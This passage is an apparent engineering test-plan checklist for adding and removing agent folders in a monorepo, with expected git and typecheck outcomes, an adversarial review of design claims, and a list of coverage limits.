- [ ] O4 Plugin agent is two folders: `pnpm agents:new demo-plugin --plugin`, point `plugin.ts` at a new `apps/demo-plugin/`, `pnpm agents:generate`. Expected: `git status --porcelain` shows only paths under `libs/agents/supported/demo-plugin/`, `apps/demo-plugin/`, and the generated set of G2b (including the `verify.yml` regions); no other folder.
- [ ] O5 Remove each of the 11 real agents, one throwaway worktree each (run in sequence, one at a time): regenerate. Expected per agent: typecheck green, `agents:check` clean, no planned file contains the agent's id, and the deleted paths are exactly its pages and generated entries.

- [ ] O1 Add: `pnpm agents:new demo-agent`, edit the names, `pnpm agents:generate`. Expected: `git status --porcelain` shows only `libs/agents/supported/demo-agent/` and the generated set of G1 (with `demo-agent`); `pnpm verify all` green; `mint dev` shows the page in both languages, in the nav and in the matrix; the install page names Demo Agent.
- [ ] O2 Remove: `rm -r libs/agents/supported/demo-agent`, `pnpm agents:generate`. Expected: `git status --porcelain` empty.
- [ ] O3 Remove a real agent (cursor) in a throwaway worktree, regenerate. Expected: typecheck green, `pnpm verify all` green, `mint broken-links` exit 0; `pnpm agents:mentions cursor` lists only illustrative mentions (if any), each with its path.

## Edge cases found during execution

Empty on purpose.

## Adversarial review

- [ ] Claim 1: "the install page is byte-identical apart from section order" — attack: the Parity-with-main row above (render on `origin/main` against the head for both locales, with and without a standby, after sorting the sections) and `surfaces.test.ts`; result: <refuted | held>
- [ ] Claim 2: "removing a folder needs no other edit" — attack: O3 for the agent with the most cross-references (claude-code: connector runtime, install-e2e, background running); result: <refuted | held>
- [ ] Claim 4: "a plugin agent is exactly two folders" — attack: O4 with a Python plugin and with an npm plugin; also search `git grep -n -i 'hermes\|openclaw' -- .github package.json scripts docs/runbooks` for any agent name left outside the agent folders and the plugin packages; result: <refuted | held>
- [ ] Claim 3: "the Worker never bundles docs content" — attack: B5 grep plus a dependency trace from `install-page.ts` with `esbuild --metafile`; result: <refuted | held>

## Coverage honesty

- The hosted Mintlify build is not exercised, only `mint dev` (as in ADR 0030).
- No real AI install is rerun. The section bytes are proved identical instead.
- The Docker plugin end to end is opt-in.
- The real `claude` and `codex` binaries are not run; the fakes are.
- Illustrative mentions are reported, not gated.
- An agent that needs a new pinned wake provider is out of scope (ADR 0019).
